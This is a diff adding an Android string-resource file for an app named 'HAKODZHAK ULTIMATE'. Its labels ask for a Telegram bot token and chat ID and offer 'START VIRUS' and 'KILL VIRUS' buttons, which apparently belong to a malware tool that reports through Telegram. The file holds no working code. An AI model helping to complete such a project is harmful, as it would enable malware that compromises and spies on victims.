@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">HAKODZHAK</string>
+    <string name="login_title">HAKODZHAK\nULTIMATE</string>
+    <string name="hint_token">Telegram Bot Token</string>
+    <string name="hint_chat_id">Chat ID</string>
+    <string name="btn_login">LOGIN</string>
+    <string name="dashboard_title">🔥 HAKODZHAK ULTIMATE 🔥</string>
+    <string name="btn_start">START VIRUS</string>
+    <string name="btn_kill">KILL VIRUS</string>
+</resources>
